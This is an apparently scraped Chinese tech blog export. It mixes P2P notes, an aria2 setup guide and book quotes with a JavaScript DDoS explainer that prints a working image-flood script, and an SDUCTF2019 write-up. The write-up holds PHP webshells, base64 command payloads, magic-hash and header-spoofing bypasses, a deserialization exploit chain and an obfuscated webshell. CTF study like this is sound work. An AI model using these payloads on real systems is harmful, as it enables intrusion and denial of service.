可扩展性\n在P2P网络中，节点在获取其他节点资源的同时也为其他节点服务。随着用户的加入，不仅服务的需求增加了，系统整体的资源和服务能力也在同步扩充，始终能较便捷地满足用户的需求。\n  健壮性\nP2P网络通常都是以自组织的方式建立起来的，并允许节点自由地加入和离开。由于服务是分散在各个节点之间进行的，当部分节点或网络遭到破坏时，对其他部分的影响很小。\n  高性价比\n采用P2P架构可以有效地利用互联网中散步的大量普通节点，将计算任务或存储资料分布到所有节点上，利用其中空置的计算能力或存储空间达到高性能计算和海量存储的目的。\n  隐私保护\n在P2P中，所有参与者可以提供中继转发的功能，因此大大提高了匿名通信的灵活性和可靠性，能够为用户提供更好的隐私保护。\n  负载均衡\n在P2P网络环境下由于每个节点既是服务器又是客户端，减少了对传统C/S结构中服务器计算能力、存储能力的要求，同时由于资源分布在多个节点，因此能更好地实现整个网络的负载均衡。\n  P2P加密   文件内容共享和下载，例如Napster、Gnutella、eDonkey等\n  计算能力和存储共享，例如SETI@home、Avaki等\n  基于P2P技术的协同与服务共享平台，例如JXTA等\n  即时通讯工具，包括ICQ、QQ、Yahoo Messenger等\n  P2P通讯与信息共享，例如Skype、Crowds、Onion Routing等；\n  基于P2P技术的网络电视：沸点、PPStream、 PPLive、 QQLive、 SopCast等。\n  拓扑结构 拓扑结构是指分布式系统中各个计算单元之间的物理或逻辑的互联关系，结点之间的拓扑结构一直是确定系统类型的重要依据。\nP2P网络的拓扑结构 根据结构关系可以将P2P系统细分为四种拓扑形式：\n  中心化拓扑（Centralized Topology）\n  全分布式非结构化拓扑（Decentralized Unstructured Topology）\n  全分布式结构化拓扑（Decentralized Structured Topology，也称作DHT网络）\n  半分布式拓扑（Partially Decentralized Topology）\n  中心化拓扑结构 即存在一个中心节点保存了其他所有节点的索引信息，索引信息一般包括IP地址、端口、节点资源等。\nNapster是最早出现的P2P系统之一，它的工作原理如图所示。当某个用户需要某个音乐文件时，首先连接到Napster中央索引服务器，在服务器上进行检索，服务器返回存有该文件的用户信息，再由请求者直接连到文件的所有者传输文件。Napster首先实现了文件查询与文件传输的分离，有效地节省了中央服务器的带宽消耗，减少了系统的文件传输延时。\n  优点\n 维护简单、资源发现效率高    缺点\n 中央索引服务器的瘫痪容易导致整个网络的崩溃，因此可靠性和安全性较低。 随着网络规模的扩大，对中央索引服务器进行维护和更新的费用将急剧增加，所需成本较高。 中央索引服务器的存在常引起版权问题上的纠纷，服务提供商容易被追究法律责任。    ","description":"The courese of BlockChain.There are some notes.","tags":["blockChain","bitcoin","studyNote"],"title":"BlockChain","uri":"/posts/blockchain/"},{"categories":["network"],"content":"关于JavaScript的DDoS攻击  引用：\nhttps://www.freebuf.com/news/66447.html\n 该攻击属于应用层攻击  Javascript实现DDos攻击原理分析   　现在网站的交互性都是通过JavaScript来实现的。通过添加JavaScript直接插入HTML元素，或通过远程来加载JavaScript。浏览器会读取script标签中的src属性并运行它所指向的脚本，其实不只是script标签可以用来攻击，简单来说只要是可以跨域访问的标签，如img，link等都可以实现DDos攻击。\n　既然这些标签可以访问外站的资源，那么我们是不是就可以设个定时器无限访问这个网站，从而达到攻击呢，那是肯定的。\n 如果攻击者在一个网站中嵌入了恶意JavaScript脚本，那么该网站的每一个访客都将成为DDoS攻击中的一员。网站流量越高就意味着DDoS越严重。\n入侵共享JavaScript的第三方服务器\n许多网站使用的都是普通的JavaScript库，为了节约带宽、提升性能，通常还会将JavaScript脚本共享在第三方服务器上。也就是说如果网站上包含有指向第三方服务器的脚本标签，就意味着所有访问该网站的用户都将自动下载JavaScript脚本，并执行。不幸的是，如果攻击者入侵了该第三方服务器并在JavaScript脚本中注入了DDoS攻击代码，那结果可想而知了，所有的访客也将变成DDoS攻击中的一员。\n一段简单的JS代码就能发起DoS攻击\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  \u003chead\u003e \u003cscript type='text/javascript'\u003e function imgflood(){ //var TARGET = 'victim-website.com' \tvar TARGET = \"127.0.0.1:12345\" var URI = '/index?' var pic = new Image() var rand = Math.floor(Math.random()*1000) pic.src = 'http://'+TARGET+URI+'val='+rand //pic.src = 'http://'+TARGET+URI+'val='+rand } setInterval(imgflood, 10) alert(pic.src) \u003c/script\u003e \u003c/head\u003e \u003cbody\u003e f*********************king \u003cscript type='text/javascript'\u003eimgflood()\u003c/script\u003e \u003c/body\u003e    setInterval(code, millisec):以millisec 毫秒的间隔执行code\n由于大部分网页引用jquery是从外部引用的，因此可以从此发起中间人攻击\n1  \u003cscript src=\"https://code.jquery.com/jquery-1.10.2.min.js\"\u003e   预防的话，就是通过script标签支持的属性integrity：这个属性支持验证该js脚本的hash值，确保不会引用来自外部恶意的js脚本\n1 2 3  \u003cscript src=\"https://code.jquery.com/jquery-1.10.2.min.js\" integrity=\"sha256-C6CB9UYIS9UJeqinPHWTHVqh/E1uhG5Twh+Y5qFQmYg=\" crossorigin=\"anonymous\"\u003e   中间人攻击示意图：攻击其中的请求外部js的途径\n 在写js-DDoS的问题：\nHTML引入外部js脚本，放在head中不起作用,放在body中才起作用 这是因为加载HTML文档时，先加载了js脚本后就不起作用了。 一般引入外部css文件放在head中，引入外部js脚本放在body中。 先渲染HTML文档(css)，再加载特效(js)\n","description":"","tags":["DDoS","network","javaScript"],"title":"DDoS-JavaScript","uri":"/posts/ddos-javascript/"},{"categories":["misc"],"content":"To record some strange tricks Python 1.something about math.log 如图，当math.log(125,5)时应该值为3的，但是出了一个bug\n好奇心驱使我去写一个脚本看看，然后发现这些能hack math.log函数的不在少数\n1 2 3 4 5  for i in range(2,101): for j in range(100): ij = i**j if math.log(ij, i) != j: print(i,'\\t',j)   然后去ubuntu虚拟机尝试了python2，发现也有这个问题\n看了官方文档，发现有底数的对数函数是通过换底公式实现的，统一换成以e为底的对数去计算，因此会有除法的溢出导致以上问题。\n   math.``log(x[, base])\nWith one argument, return the natural logarithm of x (to base e). With two arguments, return the logarithm of x to the given base, calculated as log(x)/log(base).\n   1  math.log(x[,base]) = log(x) / log(base)   哪怕是math.log(x**y,x)也会有这个问题。\n最有力的证明：\n ","description":"","tags":[],"title":"tricks","uri":"/posts/tricks/"},{"categories":["tech"],"content":"Aria2  参考：\naria2\naria2 manual\ngithub-aria2\nWindows 下如何配置 Aria 2\nAriaNg 强大的 Aria2 Web 端 安装及使用\n  webui配置：\nYAAW\nAriaNg\n 由于不想下载可爱的迅雷，于是搜索搜索就得到了这个下载工具——Aria2\n这东西不仅可以当作下载器，而且可以支持各种协议，包括bt等等\n安装步骤 1.进入官方页面 Aria2，也可以去官方github的项目地址 https://github.com/aria2/aria2/releases/tag/release-1.35.0 下载release包，也可以下源码自己编译。\n2.下载之后解压至目录下，然后再该目录下新建以下4个文件\n  Aria2.log：日志，空文件即可 aria2.session：下载历史，空文件即可 aria2.conf：配置文件 run.bat or run.vbs：用于自动启动或隐藏窗口，可选   Aria2.conf如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118  ## '#'开头为注释内容, 选项都有相应的注释说明, 根据需要修改 ## ## 被注释的选项填写的是默认值, 建议在需要修改时再取消注释 ## ## 文件保存相关 ## # 文件的保存路径(可使用绝对路径或相对路径), 默认: 当前启动位置 dir=aira2/downloads # 启用磁盘缓存, 0为禁用缓存, 需1.16以上版本, 默认:16M #disk-cache=32M # 文件预分配方式, 能有效降低磁盘碎片, 默认:prealloc # 预分配所需时间: none \u003c falloc ? trunc \u003c prealloc # falloc和trunc则需要文件系统和内核支持 # NTFS建议使用falloc, EXT3/4建议trunc, MAC 下需要注释此项 #file-allocation=none # 断点续传 continue=true log=aria2/aria2.log ## 下载连接相关 ## # 最大同时下载任务数, 运行时可修改, 默认:5 #max-concurrent-downloads=5 # 同一服务器连接数, 添加时可指定, 默认:1 max-connection-per-server=5 # 最小文件分片大小, 添加时可指定, 取值范围1M -1024M, 默认:20M # 假定size=10M, 文件为20MiB 则使用两个来源下载; 文件为15MiB 则使用一个来源下载 min-split-size=10M # 单个任务最大线程数, 添加时可指定, 默认:5 #split=5 # 整体下载速度限制, 运行时可修改, 默认:0 #max-overall-download-limit=0 # 单个任务下载速度限制, 默认:0 #max-download-limit=0 # 整体上传速度限制, 运行时可修改, 默认:0 #max-overall-upload-limit=0 # 单个任务上传速度限制, 默认:0 #max-upload-limit=0 # 禁用IPv6, 默认:false #disable-ipv6=true # 连接超时时间, 默认:60 #timeout=60 # 最大重试次数, 设置为0表示不限制重试次数, 默认:5 #max-tries=5 # 设置重试等待的秒数, 默认:0 #retry-wait=0 ## 进度保存相关 ## # 从会话文件中读取下载任务 input-file=aria2/aria2.session # 在Aria2退出时保存`错误/未完成`的下载任务到会话文件 save-session=aria2/aria2.session # 定时保存会话, 0为退出时才保存, 需1.16.1以上版本, 默认:0 #save-session-interval=60 ## RPC相关设置 ## # 启用RPC, 默认:false enable-rpc=true # 允许所有来源, 默认:false rpc-allow-origin-all=true # 允许非外部访问, 默认:false rpc-listen-all=true # 事件轮询方式, 取值:[epoll, kqueue, port, poll, select], 不同系统默认值不同 #event-poll=select # RPC监听端口, 端口被占用时可以修改, 默认:6800 #rpc-listen-port=6800 # 设置的RPC授权令牌, v1.18.4新增功能, 取代 --rpc-user 和 --rpc-passwd 选项 #rpc-secret=\u003cTOKEN\u003e # 设置的RPC访问用户名, 此选项新版已废弃, 建议改用 --rpc-secret 选项 #rpc-user=\u003cUSER\u003e # 设置的RPC访问密码, 此选项新版已废弃, 建议改用 --rpc-secret 选项 #rpc-passwd=\u003cPASSWD\u003e # 是否启用 RPC 服务的 SSL/TLS 加密, # 启用加密后 RPC 服务需要使用 https 或者 wss 协议连接 #rpc-secure=true # 在 RPC 服务中启用 SSL/TLS 加密时的证书文件, # 使用 PEM 格式时，您必须通过 --rpc-private-key 指定私钥 #rpc-certificate=/path/to/certificate.pem # 在 RPC 服务中启用 SSL/TLS 加密时的私钥文件 #rpc-private-key=/path/to/certificate.key ## BT/PT下载相关 ## # 当下载的是一个种子(以.torrent结尾)时, 自动开始BT任务, 默认:true #follow-torrent=true # BT监听端口, 当端口被屏蔽时使用, 默认:6881-6999 listen-port=51413 # 单个种子最大连接数, 默认:55 #bt-max-peers=55 # 打开DHT功能, PT需要禁用, 默认:true enable-dht=false # 打开IPv6 DHT功能, PT需要禁用 #enable-dht6=false # DHT网络监听端口, 默认:6881-6999 #dht-listen-port=6881-6999 # 本地节点查找, PT需要禁用, 默认:false #bt-enable-lpd=false # 种子交换, PT需要禁用, 默认:true enable-peer-exchange=false # 每个种子限速, 对少种的PT很有用, 默认:50K #bt-request-peer-speed-limit=50K # 客户端伪装, PT需要 peer-id-prefix=-TR2770- user-agent=Transmission/2.77 peer-agent=Transmission/2.77 # 当种子的分享率达到这个数时, 自动停止做种, 0为一直做种, 默认:1.0 seed-ratio=0 # 强制保存会话, 即使任务已经完成, 默认:false # 较新的版本开启后会在任务完成后依然保留.aria2文件 #force-save=false # BT校验相关, 默认:true #bt-hash-check-seed=true # 继续之前的BT任务时, 无需再次校验, 默认:false bt-seed-unverified=true # 保存磁力链接元数据为种子文件(.torrent文件), 默认:false bt-save-metadata=true   注意修改以下选项：\ndir=\\path\\to\\Download\\ （下载文件保存路径，改为你想要的）\nlog=\\path\\to\\Aria2\\Aria2.log （日志文件，路径D:\\App\\Aria2\\改为你安装aria2的路径）\ninput-file=\\path\\to\\Aria2\\aria2.session\nsave-session=\\path\\to\\Aria2\\aria2.session\n以下是可以自动隐藏运行aria2的脚本\nCreateObject(\"WScript.Shell\").Run \"D:\\App\\Aria2\\aria2c.exe --conf-path=aria2.conf\",0 3. 管理Aria 2 下载任务\n 首先我们要打开Aria2 的WebUI，即YAWW或者AriaNg 然后再页面的设置中将JSON-RPC Path设置为http://localhost:6800/jsonrpc 点保存，即可。  ","description":"","tags":[],"title":"aria2","uri":"/posts/aria2/"},{"categories":["Reading"],"content":"Le Petit Prince 小王子\n希望我能如小王子一样，被一朵玫瑰所驯化~\n希望我下次再读这本书时会有不一样的感受把。\n   我告诉你这么多有关B612号小行星的事情，让你知道它的编号，是因为大人。大人热爱数字。......\n  如果有人爱上一朵花，天上的星星有亿万颗，而这朵花只长在其中一颗上，这足以让他再仰望夜空时感到很快乐。他会告诉自己：“在星空的某处有我的花。”\n  可惜从前我什么都不懂！我应该看着她的行动，而不是听她的言语！她为我散发芬芳，点亮我的生活。我不应该离开她的，我应该看出藏在她那些后面的柔情。花儿的心事好难捉摸的！当时我太小了，不懂得爱是什么。\n  “那你可以审判自己，”国王回答说，“这是最难的。审判自己比审判别人难得多。如果你能正确地审判自己，那你就是真正的聪明人”、\n  看东西只有用心才能看得清楚，重要的东西用眼睛看不见的。\n  正是你为你的玫瑰付出的时间，使得你的玫瑰是如此的重要。\n  ","description":"","tags":[],"title":"Le Petit Prince Note","uri":"/posts/le-petit-prince-note/"},{"categories":["ctf"],"content":"SDUCTF2019-WriteUp 刚入门了ctf2周，便有新生赛玩，真好。\nPS.刚准备写wp又放出来一题QAQ\n！！！写wp一半又放出题目\n说好的周六早上放题的，结果早上起来一脸懵逼\n校园网下pwntools下到崩溃啊啊啊啊啊\nWeb 0x01 最简答的Web题  题目描述：flag就在html里面，右键点击查看源代码即可查看\n 直接F12查看源码，找到flag\n0x02 按钮点击  题目描述： 想方设法点击按钮\n 进入页面一个灰色的按钮，F12查看源码\n删除button标签里的disabled即可点击按钮\n1  \u003cinput style=\"width: 150px; height: 60px; font-size: 30px;\" type=\"button\" onclick=\"c()\" value=\"flag\" disabled=\"\"\u003e   后面好奇，发现flag就在click2.js里，被base64加密过\n0x03 量子波动速读  题目描述： 你会量子波动速读吗？\n 进入页面就一个按钮，点击查看，发现一闪而过的fakeflag\n1 2 3  \u003cbutton onclick=\"window.location.href = 'flag_is_here.html'\"\u003e 点击查看flag \u003c/button\u003e   源码如上，输入url/flag_is_here.html发现就是刚才一闪而过的页面\n利用burpsuite抓包即可，因为所有请求被burpsuite拦截，所以可以看到/flag_is_here.html但是页面上给的是fake ctf，明显不是flag，查看源码得到flag，我是直接用repeater发一个包获得Response。\n0x04 芝麻开门  题目描述： 简单的提交，芝麻开门\n 直接复制题目的zhimakaimen进去，返回的是口令错误\n查看burpsuite拦截的包，好像是因为他的输入框有长度限制，所以少了一个字母\n利用burpsuite的repeater重新发一个完整的包，得到flag\n0x05 Funny Button  题目描述： 有趣的按钮，你能点到吗？\n 即示例的题目，删除html的css或js都可以，甚至可以用tab键选中button按钮，点击去就是flag\n0x06 曲奇  题目描述： 你喜欢吃曲奇饼干吗？\n 曲奇==cookies，直接查看网站cookies即可\nflag即在内容里，注意flag要进行url解码\n0x07 GET  题目描述： 你就是个没有感情的浏览器\n 我是一个莫得感情的get机器\n0x08 未来浏览器  题目描述： 小王正在追剧《亲爱的，热爱的》，电脑屏幕。。。。（谁帮我编个） 当他再次醒来。。。。。。。\n 有题目已知，用burpsuite改http头属性User-Agent即可\n1  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/6666.6.6666.66 Safari/537.36   改后发包得到flag\n0x09 POST  题目描述： 你就是一个没有感情的浏览器\n 我只是一个莫得感情的post机器\n利用firefox插件HackBar发送post请求，或者用burpsuite也行\n0x0a vim好用啊  题目描述： 小明同学用vim编辑主页的时候，实验室断电了！\n 由题目得知用vim时断电，用过vim的人都知道，当vim非正常退出时会创建一个保护的缓存文件，现在word也一样。\n直接百度搜vim异常退出的备份文件，因为上次做过类似的，试试index.php.bak和index.php~没用，就百度了一下，得知备份文件格式为.index.php.swp，访问url/.index.php.swp下载文件得到.index.php.swp\n得知flag在url/vimvimvimvim.php里，果然vim是最好的编辑器（狗头保命\n0x0b 一句话木马  题目描述： 听说过一句话木马吗？ 听说过中国菜刀吗？ 听说过中国蚁剑吗？ 快去了解一下吧！！\n 看刀\u003c!--php eval(@$_POST[\"cmd\"]);--\u003e就可知是一句话木马，对这个稍微了解一下，去github获取中国蚁剑即可\n不过有一个坑，就是他默认访问是index.php，但是通过中国蚁剑连不上，回头看页面，发现在题目中有一个shell.php，于是尝试url/shell.php加上密码cmd，成功连上得到flag\n0x0c 达拉崩吧  题目描述： 达拉崩吧打怪小游戏\n 进入页面是个小游戏，发现是hackergame2019原题嘤嘤嘤\n原题wp： https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E8%BE%BE%E6%8B%89%E5%B4%A9%E5%90%A7%E5%A4%A7%E5%86%92%E9%99%A9/README.md\n在买菜这里，有一个大整数溢出，后续会搞懂这个原理\n原理如下： https://blog.csdn.net/zhenghhgz/article/details/78657917\n 原意是javascript的所有数字，无论整数还是小数，类型都为Number，为64位浮点数。因此，JavaScript中所有的数都是浮点数。遵循IEEE 754标准（浮点数算术标准），JavaScript所能表示的数值范围为正负1.7976931348623157乘以10的308次方，其最小所能表示的小数为正负5乘以10的负324次方，这两个边界值可以分别通过访问Number对象的MAX_VALUE属性和MIN_VALUE属性来获取。\nJavaScript能表示并进行精确算术运算的整数范围为：正负2的53次方，也即从最小值-9007199254740992到最大值+9007199254740992之间的范围；对于超过这个范围的整数，JavaScript依旧可以进行运算，但却不保证运算结果的精度。值得注意的是，对于整数的位运算（比如移位等操作），JavaScript仅支持32位整型数，也即从-2147483648到+2147483647之间的整数。\n 然后得到flag\n0x0d HTTP头  题目描述： 你了解http头吗？\n 根据题目，直接查看http Response Headers\n得到flag：F1ag: flag{096b5778-cf23-4f03-8c45-2505b7670b89}\n0x0e robots  题目描述： 你听说过robots协议吗？ 他可是每个机器人都需要遵守的协议啊！（笑话）\n 由题目知，robots是一个限制爬虫的东西，直接访问url/robots.txt\nUser-agent: * Disallow: / Disallow: f1ag_1s_h3re.php 得到如上页面，访问url/f1ag_1s_h3re.php，得到flag\n0x0f 你的IP不太对  题目描述：小伙计，你的IP不太对啊 这个网站可不是任何ip都能访问的\n 由题目可知，需要改ip成111.111.111.111访问，易知是XFF伪造\n利用burpsuite抓包，在header里加上X-Forwarded-For:111.111.111.111即可，发送包，得到flag\n0x10 登录  题目描述： 小王做了一个网站需要登录，但是验证貌似有点漏洞\n 进入页面之后发现button是没有用的，F5刷新之后抓包，发现有一个cookie\n尝试将Cookie改成Cookie: Login=1，发现成功得到flag在button上\n0x11 破解md5  题目描述： md5是坚不可破的，是真的吗？\n 进入页面之后直接查看源码，如题直接百度搜索php MD5漏洞。\n 引自： https://blog.csdn.net/qq_19980431/article/details/83018232\n 1 2 3 4 5 6 7 8 9  \u003c!-- if (isset($_GET['a']) and isset($_GET['b'])) { if ($_GET['a'] != $_GET['b']) if (md5($_GET['a']) == md5($_GET['b'])) die('Flag: '.$flag); else print 'Wrong.'; } --\u003e   若要求满足上述条件则 那么要求name和password数值不同但是MD5相同，在这里可以利用绕过。 PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么PHP将会认为他们相同，都是0。\n 以下值在md5加密后以0E开头：\n QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a  以下值在sha1加密后以0E开头：\n sha1(‘aaroZmOk’) sha1(‘aaK1STfY’) sha1(‘aaO8zKZF’) sha1(‘aa3OFF9m’)   直接传入url/?a=QNKCDZO\u0026b=240610708，得到flag\n0x12 php是最好的语言  题目描述： php是最好的语言?\n 进入页面如上图，点击查看source.php\n1 2 3 4 5 6 7 8 9 10 11 12  \u003c?php if ($_SERVER[\"REQUEST_METHOD\"] == \"POST\") { $flag=\"flag{this_is_flag}\"; $pass=\"\"; $thepassword_123=\"不告诉你\"; extract($_POST); } ?\u003e\u003cdiv\u003e \u003cp\u003e\u003c?php if ($pass == $thepassword_123) { echo $flag;} else {echo \"ha,你永远猜不到\";} ?\u003e\u003c/p\u003e \u003c/div\u003e   得到php源码，百度php extract函数，得知extract()有个变量覆盖漏洞\n由php源码得知所有变量名，直接出入post参数pass=\u0026thepassword_123=\n得到flag\n0x13 一句话木马2  题目描述： 在现实世界中，最原始的一句话木马往往会被waf给拦截，所以在使用过程中一般会进行编码或者加密。 这里使用最简单的编码，你能成功利用这个后门吗？\n 进入网页查看源码\n百度得知waf是Web Application Firewall的简称。\n这题应该是要绕过waf，进行获取webshell\n由\u003c!--php @eval(@base64_decode($_POST[\"cmd\"])); --\u003e和题目shell.php得知：实在shell.php执行一句话木马\n system('ls'); base64\u003e\u003e\u003ec3lzdGVtKCdscycpOw== system('cat ffffllllaaaagggg') base64\u003e\u003e\u003ec3lzdGVtKCdjYXQgZmZmZmxsbGxhYWFhZ2dnZycpOw== 注：别在网页中解base64，不同网页也许会将字符串先url编码或者Unicode编码在进行base64加密，直接用burpsuite带的base64encode，然后发包即可\n得知flag在同目录下的ffffllllaaaagggg里\n得到flag\n0x14 拼手速  题目描述： 你就是个没有感情的浏览器，但是你的手速够快吗？\n 进入页面\n如题，提交get请求url/?first=cyber\n如题，提交post请求sceond=ans（因为计算式每次都会变，所以我这用ans替代，不过也没关系，得到如下页面\n因为每次刷新get页面是计算式都会变，所以我想到了用python的requests的库，脚本如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  import requests import re url = \"http://url/?first=cyber\" reflag = '\\d\\*\\d\\+\\d\\*\\d' def qa(): r1 = requests.get(url) print(r1.text) r2 = re.search(reflag,r1.text) print(r2.group()) ans = eval(r2.group()) print(ans) ck = str(r1.cookies) pd = re.search('PHPSESSID=.* for',ck) pd = pd.group().split(' for')[0] print(pd) header = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Cookie\":pd, \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\" } data = {\"second\":ans} print(header) r4 =requests.post(url,headers=header,data=data) print(r4) print(r4.text)#flag return r4 aa = qa() #print(aa)   跑出来结果如下，得到flag\n0x15 信息泄露  题目描述： 信息泄露了，快拿到它\n 猜是php+Git泄露，参考如下文章，访问http://url/.git/HEAD，果然下载了HEAD文件\n文件里写着：ref: refs/heads/master，按如下文章提取了访问url/refs/heads/master，提取了master里的文件：985e6ce910e4cffa9957cf88fd9ac28c13654d6c\n https://www.jianshu.com/p/0ea09975169d\nhttps://www.cnblogs.com/xhds/p/10884647.html\n 然后发现GitHack一波就得到flag了emmmmmmmm\n0x16 web图床  题目描述： 图床开发中，先放出来给你们玩一下\n 进入发现是一个登陆网页，想要注入却是登陆失败，那就注册一个试试\n注册后登陆进去，是一个可以上传图片的网页，其他啥东西也没有，推测是用图片做一句话木马\n1  copy\ta.png/b+1.php t.png   但是发现上传上去之后返回的是就是图片，改后缀也无法访问其php文件\n于是尝试了各种图片一句话木马的可能，比如截断，抓包改后缀，发现服务器只接受图片文件，而且无论是什么格式的图片会被改成png格式进行呈现，而且不能上传其他格式的文件。\n其中中间网页貌似崩了一下，看到是ThinkPHP V5.1 ，百度搜其漏洞，发现也没法实现\n其展示的后面解md5得到是172.2.0.2，想着内网地址也没得访问，后面跟着也是文件的MD5值\nIndex of /upload/fd40c7f4125a9b9ff1a4e75d293e3080/ MD5(172.2.0.2) = fd40c7f4125a9b9ff1a4e75d293e3080 抓包看Cookie解析之后，想改Cookie其中的文件后缀也没用。\n后面实在没思路了，就打算对网站进行一波路径扫描，结果发现了惊喜，有一个www.tar.gz，访问下载文件，发现就是php源码了。\n不过我还没到能完全审计php源码的高度，我就将其中一部分的源码取用百度搜索，果然搜到了原题\n https://www.freebuf.com/column/205789.html\nhttps://blog.csdn.net/qq_26406447/article/details/90671853\nhttps://www.zhaoj.in/read-5873.html\n 通过PHP反序列化，得到cookie去使文件转化时，解析成php。\nphp发序列号程序如下，用生成的结果替换已有的Cookie即可\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54  \u003c?php namespace app\\web\\controller; class Profile { public $checker; public $filename_tmp; public $filename; public $upload_menu; public $ext; public $img; public $except; public function __get($name) { return $this-\u003eexcept[$name]; } public function __call($name, $arguments) { if($this-\u003e{$name}){ $this-\u003e{$this-\u003e{$name}}($arguments); } } } class Register { public $checker; public $registed; public function __destruct() { if(!$this-\u003eregisted){ $this-\u003echecker-\u003eindex(); } } } $profile = new Profile(); $profile-\u003eexcept = ['index' =\u003e 'img']; $profile-\u003eimg = \"upload_img\"; $profile-\u003eext = \"png\"; $profile-\u003efilename_tmp = \"../public/upload/md5(user)/md5(filename).png\"; $profile-\u003efilename = \"../public/upload/md5(user)/xxx.php\"; $register = new Register(); $register-\u003eregisted = false; $register-\u003echecker = $profile; echo urlencode(base64_encode(serialize($register)));   不过复现时也遇到了不少麻烦，通过以下代码构造payload然后去替代我们的Cookie，刷新后得到我们修改后缀的php图片马。\n不过在用户已登录时改Cookie时没用，要等到退出账户到登陆界面时设置新建Cookie，再刷新得到如下界面说明成功了\n此时，去访问url/upload/即可看到我们修改的php后缀的文件，同时在上传做php图片马时也遇到了问题\n以下是中国蚁剑生成的免杀马，和png图片拼接在一起上传后发现无法解析\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  \u003c?php class ISGM { function MaRC() { $XYUg = \"\\xf9\" ^ \"\\x98\"; $LaqL = \"\\x57\" ^ \"\\x24\"; $LXlg = \"\\xe0\" ^ \"\\x93\"; $kYoS = \"\\x7a\" ^ \"\\x1f\"; $zzTF = \"\\xaf\" ^ \"\\xdd\"; $hteZ = \"\\x9f\" ^ \"\\xeb\"; $DBlL =$XYUg.$LaqL.$LXlg.$kYoS.$zzTF.$hteZ; return $DBlL; } function __destruct(){ $LlRV=$this-\u003eMaRC(); @$LlRV($this-\u003eSo); } } $isgm = new ISGM(); @$isgm-\u003eSo = isset($_GET['id'])?base64_decode($_POST['pass']):$_POST['pass']; ?\u003e  然后尝试自己写了一个，拼接在一起也没有躲开这个错误的厄运\n查看图片马的源码发现如下：\n可能是png文件尾和php头部拼接，导致一些转义问题，php失去头部\u003c?php导致解析php解析失败\n然后尝试用jpg文件去做一个图片马、上传，果然成功了\n然后用中国蚁剑连上服务器，在根目录下找到flag\nMisc 0x01 Gif  题目描述： Gif你眼神够快吗？\n 用StegSolve.jar 打开目标gif，即可逐帧查看，一共六帧，4帧都是flag需要自己拼接。\n拼接完得到flagSDUCTF{Gif_is_very_interesting}\n0x02 PDF  题目描述： pdf里面藏了啥？\n 跟攻防世界的一题misc一样，随便找个网站将pdf转doc，然后把图片拖开flag就藏在下面。\n或者用一些pdf编辑器也做的到。\n0x03 今晚月色美吗  题目描述： 小王同学在路上走路，突然发现小朱同学发了一条朋友圈，配图是美美的月亮。于是小王同学心血来潮，掏出手机也拍了一张照片。你觉得月亮有什么奇怪的地方吗？\n 用StegSolve查看，原以为是加密，，没想到是藏在不同色差层。\n0x04 聋子听声音  题目描述：\n 我这边用的是Audacity，据说AU也可以查看，根据题目描述，音频应该不是隐写，而是藏在频谱图里\n查看频谱图就可得flag\n0x05 二进制  题目描述：看二进制你能看出个什么花样来？\n 原本没有思路的，将文件扔进binwalk和foremost跑没跑出东西，用less，more没跑出来，最后自暴自弃用cat一试，flag就出来了，我还以为有什么隐写emmmmmmmmmm\n结果是一堆0加上flag\n另一种办法，用010editor打开，直接搜索flag，得到flag\n0x06 奇怪的压缩文件  题目描述： eva说她给tom发了一张二维码，但是Tom接收文件后觉得不太对劲。\n 打开附件PIC.zip，发现里面有四个压缩文件，发现解压不了。扔binwalk跑一波发现是jpeg，直接改后缀得到jpg图片。\n四个压缩文件分别是QRcode四等分，用画图把他们拼一起，获得一张完整的二维码，扫码得到flag。\n0x07 zip  题目描述： 这是一个加密的压缩包，你能打开它吗？\n 发现没有截图，就说下思路把，转手就去把图截了，显示一个password.zip伪加密，用ZipCenOp解开伪加密，看到里面还有一个压缩包\n但是压缩包里面是一个图片文件，写着flag不在这\n于是就把里面那个zip拖进010editor查看，发现是隐写一个压缩包，直接看到flag，复制提交就完了\n0x08 猜拳  题目描述： 猜拳，你能赢过机器人吗？\n 又是没有思路的pwn，上网搜索得知python有个pwn库可以计算随机数种子，既然是猜，我就自己找一波规律。\nrobot: bsj sjb jbs I can win: jbs bsj sjb 找规律得知对面出拳是一个循环，自己手动解一波得到flag\n(竟然改成Misc了，果然不是一道pwn题)\nPWN 0x01 Simple nc  题目描述： 你会使用nc命令吗? 可能是全球最简单的pwn题目\n 虽然pwn还没入门，不过这确实是最简单得pwn。\n熟悉nc即netcat命令即可，netcat ctf.sec.sdunet.cn 38849直接连上通过ls,cat命令读取flag\n0x02 StackOverflow  题目描述： 作为程序员怎么会不知道 https://stackoverflow.com/\n 一道基本的栈溢出题目，但是中间的编码问题令人烦躁\n用IDA逆向，看到主函数。\n进入hello()函数可以看到如下：其中有get函数\n根据ctf-wiki的pwn的基本教程的get栈溢出就可以做出来\n还在其中找到success，这应该就是我们getshell的函数\n根据ctf-wiki构造exp\n1 2 3 4 5 6 7 8 9 10 11  from pwn import * sh = remote(\"ctf.sec.sdunet.cn\",\"38268\") 